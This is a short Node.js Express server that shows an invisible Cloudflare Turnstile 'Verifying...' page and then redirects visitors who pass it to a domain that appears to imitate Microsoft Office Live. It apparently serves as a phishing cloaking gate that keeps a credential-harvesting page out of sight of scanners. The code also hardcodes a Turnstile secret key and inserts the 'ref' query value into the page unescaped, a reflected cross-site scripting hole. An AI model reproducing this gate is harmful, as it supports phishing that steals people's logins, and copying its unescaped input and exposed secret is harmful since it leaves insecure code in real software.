const express = require("express");
const fetch = require("node-fetch");
const app = express();

const TURNSTILE_SECRET_KEY = "0x4AAAAAABINXgwjoV7PP_UDmQTDYq9AXog"; // Replace this
const BACKEND_URL = "https://fficelivel.art/Home.html";

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get("/", (req, res) => {
  const ref = req.query.ref || "";

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Verifying...</title>
      <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    </head>
    <body>
      <form id="challenge-form" method="POST">
        <input type="hidden" name="cf-turnstile-response" id="cf-token">
        <input type="hidden" name="ref" value="${ref}">
        <button type="submit" style="display:none;"></button>
      </form>

      <script>
        window.onload = function () {
          turnstile.render('#challenge-form', {
            sitekey: 'YOUR_SITE_KEY',
            size: 'invisible',
            callback: function(token) {
              document.getElementById('cf-token').value = token;
              document.getElementById('challenge-form').submit();
            }
          });
        };
      </script>
    </body>
    </html>
  `);
});

app.post("/", async (req, res) => {
  const token = req.body["cf-turnstile-response"];
  const ref = req.body.ref || "";

  if (!token) {
    return res.status(400).send("Missing token");
  }

  const verifyRes = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: `secret=${TURNSTILE_SECRET_KEY}&response=${token}`
  });

  const data = await verifyRes.json();

  if (data.success) {
    const target = new URL(BACKEND_URL);
    if (ref) target.searchParams.set("ref", ref);
    return res.redirect(target.toString());
  } else {
    return res.status(403).send("Turnstile verification failed.");
  }
});

app.listen(3000, () => console.log("Listening on port 3000"));
